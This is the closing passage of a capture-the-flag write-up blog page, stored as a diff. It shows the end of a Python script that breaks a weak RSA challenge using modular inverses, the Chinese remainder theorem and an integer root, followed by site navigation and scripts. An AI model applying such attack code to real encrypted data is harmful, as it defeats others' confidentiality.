class="attribute">d1</span>=invmod(e1,f1)</span><br><span class="line"><span class="attribute">d2</span>=invmod(e2,f2)</span><br><span class="line"><span class="attribute">m1</span>=pow(c1,d1,n1)</span><br><span class="line"><span class="attribute">m2</span>=pow(c2,d2,n2)</span><br><span class="line"><span class="attribute">m3</span>=m1%p</span><br><span class="line"><span class="attribute">m2</span>=m2%q2</span><br><span class="line"><span class="attribute">m1</span>=m1%q1</span><br><span class="line"><span class="attribute">m</span>=solve_crt([m1,m2,m3], [q1,q2,p])</span><br><span class="line"><span class="builtin-name">print</span> m</span><br><span class="line"><span class="attribute">n</span>=q1*q2</span><br><span class="line">f=(q1-1)*(q2-1)</span><br><span class="line"><span class="attribute">m</span>=m%n</span><br><span class="line"><span class="attribute">d</span>=invmod(7,f)</span><br><span class="line"><span class="attribute">m</span>=pow(m,d,n)</span><br><span class="line"><span class="builtin-name">print</span> n2s(gmpy2.iroot(m, 2)[0])</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/11/16/ELS-2018-WriteUp/11.png" alt=""></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/12/18/ThinkPhp5-0x-Getshell-%E5%88%86%E6%9E%90/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          ThinkPhp5.0x_Getshell_分析
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/11/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E5%A4%8D%E4%B9%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">网络安全课程复习</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SimpleBBS"><span class="nav-number">1.1.</span> <span class="nav-text">SimpleBBS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SimpleServerInjection"><span class="nav-number">1.2.</span> <span class="nav-text">SimpleServerInjection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SimpleExtensionExplorerInjection"><span class="nav-number">1.3.</span> <span class="nav-text">SimpleExtensionExplorerInjection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SimplePrintEventLogger"><span class="nav-number">1.4.</span> <span class="nav-text">SimplePrintEventLogger</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SimpleBlog"><span class="nav-number">1.5.</span> <span class="nav-text">SimpleBlog</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#gogogo"><span class="nav-number">2.1.</span> <span class="nav-text">gogogo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#checkin"><span class="nav-number">2.2.</span> <span class="nav-text">checkin</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number">3.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#AzureRSA"><span class="nav-number">3.1.</span> <span class="nav-text">AzureRSA</span></a></li></ol></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/friend" class="mobile-nav-link">Friend</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2019 Altm4nz All Rights Reserved.
+        
+            <span id="busuanzi_container_site_uv">  
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+            </span>
+          
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+    
+</script>
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
